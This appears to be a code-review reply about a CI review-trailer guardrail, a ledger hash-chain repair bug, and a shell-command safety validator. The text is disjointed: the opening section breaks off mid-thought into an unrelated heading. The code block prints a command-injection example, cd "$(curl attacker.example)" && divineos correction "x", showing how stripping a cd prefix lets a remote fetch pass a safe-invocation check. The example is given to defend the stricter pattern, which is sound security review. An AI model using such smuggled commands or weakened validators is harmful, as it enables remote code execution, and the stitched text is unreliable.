`multi-party-review` fails on #436, listing 15 commits with no `External-Review` trailer.

**That is my fix being half-done, not a missing round.** I shipped `#433` under the title *"review binds to what lands, not to branch history"* — and it does, for exactly one case. `ci_check_guardrail_trailer.sh` evaluates the net diff first and passes when it lands no guardrail-listed file. ## The one I would open with

`compress_ledger` rebuilt the chain across 11 rows, then inserted its own `LEDGER_CHAIN_REPAIRED` receipt with a `content_hash` and **no `prior_hash`, no `chain_hash`**, after the rebuild.

The one event recording a modification to the ledger was the one event the chain did not cover.

It stayed invisible because the old `verify_chain` counted unchained rows as verified — the hole and its own alarm were the same defect. `broken_at` was byte-identical to `chain_repair_event_id`.

I had filed this to Andrew as *"either the old check was asleep or mine is twitchy."* It was never a coin-flip, and framing it as one cost him an open question neither of us could answer, because the test asserted `ok` and discarded the `broken_reason` naming the row.

## Where your F114 prescription stops, with the evidence

Two barriers rejected `cd X && divineos Y`, not one — the head check **and** the chain-shape check, since `cd X && ...` genuinely is a chain. And the chain check cannot run on `stripped_command()`, which re-joins shlex tokens and drops quoting.

Then the part I want your eyes on: **your order would have been a security regression.**

```
cd "$(curl attacker.example)" && divineos correction "x"
  shared strip_prefixes_raw  ->  'divineos correction "x"'   prefix discarded
  local  _CD_PREFIX_RE       ->  refused
  _is_safe_remedy_invocation ->  SAFE
```

The bespoke copy you asked me to delete carried `[^\s;&|`$]` exclusions and a comment marking it as the block on a real exploit. It was the safer implementation. Hardened the shared pattern first, then delegated — and the weakness was mine, written earlier the same session.
